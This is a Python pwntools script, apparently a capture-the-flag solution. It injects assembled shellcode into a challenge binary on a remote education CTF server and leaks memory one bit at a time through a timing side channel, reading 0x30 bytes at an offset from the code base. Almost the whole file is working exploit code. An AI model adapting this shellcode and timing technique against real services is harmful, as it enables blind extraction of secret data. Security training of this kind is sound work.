from pwn import *

context.arch = 'amd64'

def get_a_bit(register, offset, bit, local):
    if local == 1:
        p = process('./chal')
    else:
        p = remote( 'edu-ctf.zoolab.org', 10002 )

    payload = asm('''mov al, BYTE PTR ds:[''' + register + '+' + str( offset ) + '''];
                   xor r11, r11;
                   shr al, ''' + str( bit ) +''';
                   shl al, 7;
                   shr al, 7;
                   imul rax, 0x30000000
                   loop:
                   cmp rax, r11;
                   je loop_end;
                   inc r11;
                   imul ebx, 0x29;
                   imul ebx, 0x19;
                   imul ebx, 0x23;
                   imul ebx, 0x17;
                   jmp loop;
                   loop_end:
                   ''')
    p.sendline( payload )
    current = time.time()
    print( p.recvall() )
    now = time.time()
    diff = now - current
    print( diff )
    if diff > 1:
        print('the bit is 1')
        return 1
    else:
        print('the bit is 0')
        return 0
    p.close()

def get_code_base_bit( offset, bit, local ):
    if local == 1:
        p = process('./chal')
    else:
        p = remote( 'edu-ctf.zoolab.org', 10002 )

    print( p.recvline() )
    payload = asm('''mov rbx, QWORD PTR ds:[rbp+0x18];
                   sub rbx, 0x1289;
                   add rbx, 0x4040;
                   mov al, BYTE PTR ds:[rbx+ ''' + str( offset ) + '''];
                   xor r11, r11;
                   shr al, ''' + str( bit ) +''';
                   shl al, 7;
                   shr al, 7;
                   imul rax, 0x30000000
                   loop:
                   cmp rax, r11;
                   je loop_end;
                   inc r11;
                   imul ebx, 0x29;
                   imul ebx, 0x19;
                   imul ebx, 0x23;
                   imul ebx, 0x17;
                   jmp loop;
                   loop_end:
                   ''')
    p.sendline( payload )
    current = time.time()
    print( p.recvall() )
    now = time.time()
    diff = now - current
    print( diff )
    if diff > 1:
        print('the bit is 1')
        return 1
    else:
        print('the bit is 0')
        return 0
    p.close()

def get_a_byte( register, offset, local ):
    bits = ''
    for i in range(8):
        bits = str( get_a_bit( register, offset, i, local ) ) + bits
    print( bits )
    return int( bits, 2 )

def get_code_base_byte( offset, local ):
    bits = ''
    for i in range(8):
        bits = str( get_code_base_bit( offset, i, local ) ) + bits
    print( chr( int( bits, 2 ) ) )
    return int( bits, 2 )

local = 0

# byte = hex( get_a_byte( 'rip', 0x1, local ) )
# print( 'current byte is', byte )

# byte = hex( get_a_byte( 'rbp', 0x18 + 5, local ) )
# print( 'current byte is', byte )
# input('>')
# byte = hex( get_a_byte( 'rbp', 0x18, local ) ) # 0x89
# print( 'current byte is', byte )
# input('>')
# byte = hex( get_a_byte( 'rbp', 0x18 + 1, local ) ) #0x?2
# print( 'current byte is', byte )


content = ''
for i in range( 0x30 ):
    byte = ( get_code_base_byte( i, local ) )
    content += chr( byte )
    print( content )
